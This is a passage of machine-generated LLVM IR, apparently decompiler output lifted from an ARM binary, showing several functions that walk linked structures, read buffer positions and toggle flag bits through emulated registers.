  uselistorder i32 (i32, i32)* @function_b7ac, { 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 1024, { 11, 12, 13, 4, 14, 3, 15, 2, 16, 1, 17, 6, 18, 5, 19, 7, 22, 8, 23, 9, 20, 10, 0, 21 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_10324, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_102f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_102dc, { 1, 0 }
  uselistorder label %dec_label_pc_102a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10278, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10260, { 1, 0 }
  uselistorder label %dec_label_pc_10204, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_101f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_101dc, { 1, 0 }
  uselistorder label %dec_label_pc_1019c, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_1018c, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100d4, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_1003c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_ff80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff48, { 1, 2, 0 }
}

define i32 @function_10338(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10338:
  %v0_10338 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10338, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10338
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10338, %bb
  %v0_10370 = call i32 @function_f150()
  %v3_10374 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_10374 = sext i16 %v3_10374 to i32
  store i32 %v4_10374, i32* @r3, align 4
  store i32 %v0_10370, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_10380 = add i32 %v4_10374, %v0_10370
  %v3_10380 = inttoptr i32 %v2_10380 to i32*
  %v4_10380 = load i32, i32* %v3_10380, align 4
  store i32 %v4_10380, i32* @r6, align 4
  %v1_10384 = call i32 @function_117dc(i32 0)
  %v2_1038c = icmp eq i32 %v1_10384, 0
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r4, align 4
  br i1 %v2_1038c, label %bb16, label %.thread7

bb16:                                             ; preds = %.thread4
  %v5_10398 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 324) to i16*), align 4
  %v7_10398 = zext i16 %v5_10398 to i32
  %v2_1039c = xor i32 %v7_10398, 256
  store i32 %v2_1039c, i32* @r3, align 4
  %v2_103a0 = trunc i32 %v2_1039c to i16
  store i16 %v2_103a0, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 324) to i16*), align 4
  br label %.thread7

.thread7:                                         ; preds = %.thread4, %bb16
  store i32 1, i32* @r0, align 4
  %v1_103a8 = call i32 @function_117dc(i32 1)
  %v2_103ac = icmp eq i32 %v1_103a8, 0
  br i1 %v2_103ac, label %bb17, label %.thread11

bb17:                                             ; preds = %.thread7
  %v1_103b4 = load i32, i32* @r4, align 4
  %v2_103b8 = add i32 %v1_103b4, 392
  %v3_103b8 = inttoptr i32 %v2_103b8 to i16*
  %v4_103b8 = load i16, i16* %v3_103b8, align 2
  %v2_103bc = xor i16 %v4_103b8, 256
  store i16 %v2_103bc, i16* %v3_103b8, align 2
  br label %.thread11

.thread11:                                        ; preds = %.thread7, %bb17
  %v3_103c8 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_103c8 = sext i16 %v3_103c8 to i32
  %v0_103cc = load i32, i32* @r6, align 4
  %v1_103cc = load i32, i32* @r5, align 4
  %v3_103cc = add i32 %v1_103cc, %v4_103c8
  %v4_103cc = inttoptr i32 %v3_103cc to i32*
  store i32 %v0_103cc, i32* %v4_103cc, align 4
  ret i32 %v1_103a8

; uselistorder directives
  uselistorder i32 (i32)* @function_117dc, { 2, 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_103e8() local_unnamed_addr {
dec_label_pc_103e8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_103e8 = load i32, i32* @r4, align 4
  store i32 %v3_103e8, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_103fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_103fc, i32* %r0.global-to-local, align 4
  %v5_103fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_103fc, i32* %r1.global-to-local, align 4
  %v8_103fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33092) to i32*), align 4
  %v2_10404 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10404, i32* %r3.global-to-local, align 4
  store i32 %v2_103fc, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_10410 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 152) to i32*), align 4
  store i32 %v2_103fc, i32* %r0.global-to-local, align 4
  store i32 %v5_103fc, i32* %r1.global-to-local, align 4
  store i32 %v8_103fc, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_10420 = inttoptr i32 %v4_10410 to i32*
  store i32 %v2_103fc, i32* %v1_10420, align 4
  %v3_10420 = add i32 %v4_10410, 4
  %v4_10420 = inttoptr i32 %v3_10420 to i32*
  %v5_10420 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10420, i32* %v4_10420, align 4
  %v6_10420 = add i32 %v4_10410, 8
  %v7_10420 = inttoptr i32 %v6_10420 to i32*
  %v8_10420 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10420, i32* %v7_10420, align 4
  %v0_10424 = load i32, i32* %r3.global-to-local, align 4
  %v1_10424 = inttoptr i32 %v0_10424 to i32*
  %v2_10424 = load i32, i32* %v1_10424, align 4
  store i32 %v2_10424, i32* %r0.global-to-local, align 4
  %v3_10424 = add i32 %v0_10424, 4
  %v4_10424 = inttoptr i32 %v3_10424 to i32*
  %v5_10424 = load i32, i32* %v4_10424, align 4
  store i32 %v5_10424, i32* %r1.global-to-local, align 4
  %v6_10424 = add i32 %v0_10424, 8
  %v7_10424 = inttoptr i32 %v6_10424 to i32*
  %v8_10424 = load i32, i32* %v7_10424, align 4
  %v2_10428 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10428, i32* %r3.global-to-local, align 4
  store i32 %v2_10424, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_10434 = load i32, i32* %r7.global-to-local, align 4
  %v2_10434 = add i32 %v0_10434, 76
  %v3_10434 = inttoptr i32 %v2_10434 to i32*
  %v4_10434 = load i32, i32* %v3_10434, align 4
  store i32 %v4_10434, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_1043c = inttoptr i32 %v4_10434 to i32*
  %v2_1043c = load i32, i32* %v1_1043c, align 4
  store i32 %v2_1043c, i32* %r5.global-to-local, align 4
  %v2_10440 = add i32 %v0_10434, 160
  %v3_10440 = inttoptr i32 %v2_10440 to i32*
  %v4_10440 = load i32, i32* %v3_10440, align 4
  store i32 %v2_10424, i32* %r0.global-to-local, align 4
  store i32 %v5_10424, i32* %r1.global-to-local, align 4
  store i32 %v8_10424, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_10450 = add i32 %v0_10434, -33124
  store i32 %v2_10450, i32* %sl.global-to-local, align 4
  %v1_10454 = inttoptr i32 %v4_10440 to i32*
  store i32 %v2_10424, i32* %v1_10454, align 4
  %v3_10454 = add i32 %v4_10440, 4
  %v4_10454 = inttoptr i32 %v3_10454 to i32*
  %v5_10454 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10454, i32* %v4_10454, align 4
  %v6_10454 = add i32 %v4_10440, 8
  %v7_10454 = inttoptr i32 %v6_10454 to i32*
  %v8_10454 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10454, i32* %v7_10454, align 4
  %v0_104e4.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104e416 = icmp eq i32 %v0_104e4.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_104ec18 = add i32 %v0_104e4.pr, 56
  store i32 %v1_104ec18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_104e416, label %dec_label_pc_104f8, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_103e8, %.thread10
  %v0_1045c = phi i32 [ %v3_104e0, %.thread10 ], [ %v0_104e4.pr, %dec_label_pc_103e8 ]
  %v1_1045c = add i32 %v0_1045c, 64
  %v2_1045c = inttoptr i32 %v1_1045c to i32*
  %v3_1045c = load i32, i32* %v2_1045c, align 4
  store i32 %v3_1045c, i32* %r3.global-to-local, align 4
  %v0_10460 = call i32 @function_f150()
  store i32 %v0_10460, i32* %r0.global-to-local, align 4
  %v1_10464 = add i32 %v0_10460, -1168
  store i32 %v1_10464, i32* %r6.global-to-local, align 4
  %v3_10468 = icmp uge i32 %v3_1045c, %v1_10464
  store i1 %v3_10468, i1* %cpsr_c.global-to-local, align 1
  %v9_10468 = icmp eq i32 %v3_1045c, %v1_10464
  br i1 %v9_10468, label %.thread1, label %dec_label_pc_1047c

.thread1:                                         ; preds = %dec_label_pc_1045c
  %v1_1046c = load i32, i32* %r5.global-to-local, align 4
  %v2_1046c = add i32 %v1_1046c, 60
  %v3_1046c = inttoptr i32 %v2_1046c to i32*
  %v4_1046c = load i32, i32* %v3_1046c, align 4
  %v2_10470 = add i32 %v4_1046c, 1
  store i32 %v2_10470, i32* %r3.global-to-local, align 4
  store i32 %v2_10470, i32* %v3_1046c, align 4
  br label %.thread10

dec_label_pc_1047c:                               ; preds = %dec_label_pc_1045c, %dec_label_pc_10488
  %v0_1047c = load i32, i32* %r2.global-to-local, align 4
  %v1_1047c = inttoptr i32 %v0_1047c to i32*
  %v2_1047c = load i32, i32* %v1_1047c, align 4
  store i32 %v2_1047c, i32* %r3.global-to-local, align 4
  %v1_10480 = load i32, i32* %r4.global-to-local, align 4
  %v3_10480 = icmp uge i32 %v2_1047c, %v1_10480
  store i1 %v3_10480, i1* %cpsr_c.global-to-local, align 1
  %v9_10480 = icmp eq i32 %v2_1047c, %v1_10480
  br i1 %v9_10480, label %dec_label_pc_10488, label %dec_label_pc_104a0

dec_label_pc_10488:                               ; preds = %dec_label_pc_1047c
  store i32 %v2_1047c, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10498 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10498, label %dec_label_pc_1049c, label %dec_label_pc_1047c

dec_label_pc_1049c:                               ; preds = %dec_label_pc_10488
  %v0_1049c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_104a0

dec_label_pc_104a0:                               ; preds = %dec_label_pc_1047c, %dec_label_pc_1049c
  %v0_104a0 = phi i32 [ %v0_1049c, %dec_label_pc_1049c ], [ %v2_1047c, %dec_label_pc_1047c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104a0 = icmp eq i32 %v0_104a0, 0
  %v2_104ac.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_104a0, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_104a0
  %v1_104ac = load i32, i32* %r6.global-to-local, align 4
  %v3_104ac = add i32 %v2_104ac.pre, 64
  %v4_104ac = inttoptr i32 %v3_104ac to i32*
  store i32 %v1_104ac, i32* %v4_104ac, align 4
  %v1_104b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_104b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_104b0 = add i32 %v2_104b0, 60
  %v4_104b0 = inttoptr i32 %v3_104b0 to i32*
  store i32 %v1_104b0, i32* %v4_104b0, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_104a0
  %v2_104a4 = add i32 %v2_104ac.pre, 8
  %v3_104a4 = inttoptr i32 %v2_104a4 to i32*
  %v4_104a4 = load i32, i32* %v3_104a4, align 4
  store i32 %v4_104a4, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_104b4 = add i32 %v2_104ac.pre, 20
  %v4_104b4 = inttoptr i32 %v3_104b4 to i32*
  store i32 %v4_104a4, i32* %v4_104b4, align 4
  %v1_104b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_104b8 = trunc i32 %v1_104b8 to i16
  %v3_104b8 = load i32, i32* %r5.global-to-local, align 4
  %v4_104b8 = inttoptr i32 %v3_104b8 to i16*
  store i16 %v2_104b8, i16* %v4_104b8, align 2
  %v1_104bc = load i32, i32* %r3.global-to-local, align 4
  %v2_104bc = load i32, i32* %r5.global-to-local, align 4
  %v3_104bc = add i32 %v2_104bc, 24
  %v4_104bc = inttoptr i32 %v3_104bc to i32*
  store i32 %v1_104bc, i32* %v4_104bc, align 4
  %v1_104c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_104c0 = load i32, i32* %r5.global-to-local, align 4
  %v3_104c0 = add i32 %v2_104c0, 28
  %v4_104c0 = inttoptr i32 %v3_104c0 to i32*
  store i32 %v1_104c0, i32* %v4_104c0, align 4
  %v1_104c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_104c4 = load i32, i32* %r5.global-to-local, align 4
  %v3_104c4 = add i32 %v2_104c4, 16
  %v4_104c4 = inttoptr i32 %v3_104c4 to i32*
  store i32 %v1_104c4, i32* %v4_104c4, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_104c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_104c8 = inttoptr i32 %v0_104c8 to i32*
  %v2_104c8 = load i32, i32* %v1_104c8, align 4
  store i32 %v2_104c8, i32* %r0.global-to-local, align 4
  %v3_104c8 = add i32 %v0_104c8, 4
  %v4_104c8 = inttoptr i32 %v3_104c8 to i32*
  %v5_104c8 = load i32, i32* %v4_104c8, align 4
  store i32 %v5_104c8, i32* %r1.global-to-local, align 4
  %v6_104c8 = add i32 %v0_104c8, 8
  %v7_104c8 = inttoptr i32 %v6_104c8 to i32*
  %v8_104c8 = load i32, i32* %v7_104c8, align 4
  store i32 %v8_104c8, i32* %r2.global-to-local, align 4
  %v1_104d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_104d0 = add i32 %v1_104d0, 52
  %v3_104d0 = inttoptr i32 %v2_104d0 to i32*
  store i32 1, i32* %v3_104d0, align 4
  %v0_104d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_104d4 = add i32 %v0_104d4, 56
  store i32 %v1_104d4, i32* %r3.global-to-local, align 4
  %v2_104d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_104dc = inttoptr i32 %v1_104d4 to i32*
  store i32 %v2_104d8, i32* %v1_104dc, align 4
  %v3_104dc = add i32 %v0_104d4, 60
  %v4_104dc = inttoptr i32 %v3_104dc to i32*
  %v5_104dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_104dc, i32* %v4_104dc, align 4
  %v6_104dc = add i32 %v0_104d4, 64
  %v7_104dc = inttoptr i32 %v6_104dc to i32*
  %v8_104dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_104dc, i32* %v7_104dc, align 4
  %v0_104e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_104e0 = add i32 %v0_104e0, 32
  %v2_104e0 = inttoptr i32 %v1_104e0 to i32*
  %v3_104e0 = load i32, i32* %v2_104e0, align 4
  store i32 %v3_104e0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104e4 = icmp eq i32 %v3_104e0, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_104ec = add i32 %v3_104e0, 56
  store i32 %v1_104ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_104e4, label %dec_label_pc_104f8, label %dec_label_pc_1045c

dec_label_pc_104f8:                               ; preds = %.thread10, %dec_label_pc_103e8
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_104fc = load i32, i32* %r7.global-to-local, align 4
  %v2_104fc = add i32 %v0_104fc, 76
  %v3_104fc = inttoptr i32 %v2_104fc to i32*
  %v4_104fc = load i32, i32* %v3_104fc, align 4
  store i32 %v4_104fc, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_104fc to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1051c14 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1051c14, label %dec_label_pc_10524, label %dec_label_pc_10508

dec_label_pc_10508:                               ; preds = %dec_label_pc_104f8, %dec_label_pc_1051c
  %v1_10510 = phi i32 [ %storemerge, %dec_label_pc_1051c ], [ %storemerge12, %dec_label_pc_104f8 ]
  %v1_10508 = inttoptr i32 %v1_10510 to i16*
  %v2_10508 = load i16, i16* %v1_10508, align 2
  %v3_10508 = zext i16 %v2_10508 to i32
  store i32 %v3_10508, i32* %r3.global-to-local, align 4
  %v1_1050c = and i32 %v3_10508, 64
  %v2_1050c = icmp eq i32 %v1_1050c, 0
  br i1 %v2_1050c, label %dec_label_pc_1051c, label %bb39

bb39:                                             ; preds = %dec_label_pc_10508
  store i32 %v1_10510, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_10508, %bb39
  %v1_10514 = xor i1 %v2_1050c, true
  call void @__pseudo_cond_branch(i1 %v1_10514, i32 ptrtoint (i32* @global_var_1054c.475 to i32))
  %v0_10518 = load i32, i32* %r4.global-to-local, align 4
  %v1_10518 = add i32 %v0_10518, 32
  %storemerge.in = inttoptr i32 %v1_10518 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1051c = icmp eq i32 %storemerge, 0
  br i1 %v2_1051c, label %dec_label_pc_10524, label %dec_label_pc_10508

dec_label_pc_10524:                               ; preds = %dec_label_pc_1051c, %dec_label_pc_104f8
  %v2_10528 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10528, i32* %r4.global-to-local, align 4
  %v1_1052c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1052c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_104e0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10480, { 1, 0 }
  uselistorder i32 %v4_10440, { 2, 1, 0 }
  uselistorder i32 %v4_10410, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_1051c, { 1, 0 }
  uselistorder label %dec_label_pc_10508, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_104a0, { 1, 0 }
  uselistorder label %dec_label_pc_1047c, { 1, 0 }
  uselistorder label %dec_label_pc_1045c, { 1, 0 }
}

define i32 @function_1054c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1054c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1054c = load i32, i32* @r4, align 4
  store i32 %v3_1054c, i32* %stack_var_-8, align 4
  %v1_10550 = add i32 %arg1, 8
  %v2_10550 = inttoptr i32 %v1_10550 to i32*
  %v3_10550 = load i32, i32* %v2_10550, align 4
  store i32 %v3_10550, i32* @r1, align 4
  %v1_10554 = add i32 %arg1, 16
  %v2_10554 = inttoptr i32 %v1_10554 to i32*
  %v3_10554 = load i32, i32* %v2_10554, align 4
  %v9_10558 = icmp eq i32 %v3_10554, %v3_10550
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_10558, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1054c
  store i32 %v3_10550, i32* %v2_10554, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1054c, %bb
  %v1_10564 = xor i1 %v9_10558, true
  call void @__pseudo_cond_branch(i1 %v1_10564, i32 ptrtoint (i32* @global_var_12334.476 to i32))
  %v0_10568 = load i32, i32* %r4.global-to-local, align 4
  %v1_10568 = add i32 %v0_10568, 8
  %v2_10568 = inttoptr i32 %v1_10568 to i32*
  %v3_10568 = load i32, i32* %v2_10568, align 4
  %v1_1056c = add i32 %v0_10568, 16
  %v2_1056c = inttoptr i32 %v1_1056c to i32*
  %v3_1056c = load i32, i32* %v2_1056c, align 4
  %v2_10570 = sub i32 %v3_1056c, %v3_10568
  %v2_10574 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10574, i32* @r4, align 4
  ret i32 %v2_10570

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_1057c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1057c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1057c = load i32, i32* @r4, align 4
  store i32 %v3_1057c, i32* %stack_var_-20, align 4
  %v6_1057c = load i32, i32* @r5, align 4
  %v9_1057c = load i32, i32* @r6, align 4
  %v12_1057c = load i32, i32* @r7, align 4
  %v15_1057c = load i32, i32* @lr, align 4
  %v1_10580 = add i32 %arg1, 52
  %v2_10580 = inttoptr i32 %v1_10580 to i32*
  %v3_10580 = load i32, i32* %v2_10580, align 4
  store i32 %v3_10580, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10584 = icmp eq i32 %v3_10580, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_10584, label %dec_label_pc_105b8, label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_1057c
  %v1_10594 = add i32 %arg1, 16
  %v2_10594 = inttoptr i32 %v1_10594 to i32*
  %v3_10594 = load i32, i32* %v2_10594, align 4
  store i32 %v3_10594, i32* %r2.global-to-local, align 4
  %v1_10598 = add i32 %arg1, 24
  %v2_10598 = inttoptr i32 %v1_10598 to i32*
  %v3_10598 = load i32, i32* %v2_10598, align 4
  store i32 %v3_10598, i32* %r3.global-to-local, align 4
  %v3_1059c = icmp uge i32 %v3_10594, %v3_10598
  store i1 %v3_1059c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1059c, label %dec_label_pc_105ac, label %.thread

.thread:                                          ; preds = %dec_label_pc_10594
  %v2_105a0 = inttoptr i32 %v3_10594 to i8*
  %v3_105a0 = load i8, i8* %v2_105a0, align 1
  %v4_105a0 = zext i8 %v3_105a0 to i32
  store i32 %v4_105a0, i32* %r5.global-to-local, align 4
  %v6_105a0 = add i32 %v3_10594, 1
  store i32 %v6_105a0, i32* %r2.global-to-local, align 4
  store i32 %v6_105a0, i32* %v2_10594, align 4
  br label %dec_label_pc_106b0

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10594
  %v1_105ac = inttoptr i32 %arg1 to i16*
  %v2_105ac = call i32 @function_10e38(i16* %v1_105ac)
  store i32 %v2_105ac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_106b0

dec_label_pc_105b8:                               ; preds = %dec_label_pc_1057c
  %v0_105b8 = call i32 @function_f150()
  %v0_105bc = load i32, i32* @r7, align 4
  %v1_105bc = add i32 %v0_105bc, 64
  %v2_105bc = inttoptr i32 %v1_105bc to i32*
  %v3_105bc = load i32, i32* %v2_105bc, align 4
  store i32 %v3_105bc, i32* %r3.global-to-local, align 4
  %v1_105c0 = add i32 %v0_105b8, -1168
  store i32 %v1_105c0, i32* @r6, align 4
  %v3_105c4 = icmp uge i32 %v3_105bc, %v1_105c0
  store i1 %v3_105c4, i1* %cpsr_c.global-to-local, align 1
  %v9_105c4 = icmp eq i32 %v3_105bc, %v1_105c0
  br i1 %v9_105c4, label %dec_label_pc_1060c, label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %dec_label_pc_105b8
  %v1_105cc = add i32 %v0_105bc, 56
  store i32 %v1_105cc, i32* @r5, align 4
  store i32 %v1_105cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105d8

dec_label_pc_105d8:                               ; preds = %dec_label_pc_105e4.dec_label_pc_105d8_crit_edge, %dec_label_pc_105cc
  %v0_105d8 = phi i32 [ %v0_105d8.pre, %dec_label_pc_105e4.dec_label_pc_105d8_crit_edge ], [ %v1_105cc, %dec_label_pc_105cc ]
  %v1_105d8 = inttoptr i32 %v0_105d8 to i32*
  %v2_105d8 = load i32, i32* %v1_105d8, align 4
  store i32 %v2_105d8, i32* %r3.global-to-local, align 4
  %v1_105dc = load i32, i32* @r4, align 4
  %v3_105dc = icmp uge i32 %v2_105d8, %v1_105dc
  store i1 %v3_105dc, i1* %cpsr_c.global-to-local, align 1
  %v9_105dc = icmp eq i32 %v2_105d8, %v1_105dc
  br i1 %v9_105dc, label %dec_label_pc_105e4, label %dec_label_pc_105fc

dec_label_pc_105e4:                               ; preds = %dec_label_pc_105d8
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_105f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_105f4, label %dec_label_pc_105f8, label %dec_label_pc_105e4.dec_label_pc_105d8_crit_edge

dec_label_pc_105e4.dec_label_pc_105d8_crit_edge:  ; preds = %dec_label_pc_105e4
  %v0_105d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105d8

dec_label_pc_105f8:                               ; preds = %dec_label_pc_105e4
  %v0_105f8 = load i32, i32* @r4, align 4
  store i32 %v0_105f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_105fc

dec_label_pc_105fc:                               ; preds = %dec_label_pc_105d8, %dec_label_pc_105f8
  %v0_105fc = phi i32 [ %v0_105f8, %dec_label_pc_105f8 ], [ %v2_105d8, %dec_label_pc_105d8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105fc = icmp eq i32 %v0_105fc, 0
  br i1 %v2_105fc, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_105fc
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_105fc, %bb
  store i32 67080, i32* @lr, align 4
  %v1_10604 = xor i1 %v2_105fc, true
  call void @__pseudo_cond_branch(i1 %v1_10604, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10608 = load i32, i32* @r6, align 4
  %v1_10608 = load i32, i32* @r7, align 4
  %v2_10608 = add i32 %v1_10608, 64
  %v3_10608 = inttoptr i32 %v2_10608 to i32*
  store i32 %v0_10608, i32* %v3_10608, align 4
  %v0_1060c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1060c

dec_label_pc_1060c:                               ; preds = %dec_label_pc_105b8, %bb18
  %v1_1061c = phi i32 [ %v0_105bc, %dec_label_pc_105b8 ], [ %v0_1060c.pre, %bb18 ]
  %v1_1060c = add i32 %v1_1061c, 60
  %v2_1060c = inttoptr i32 %v1_1060c to i32*
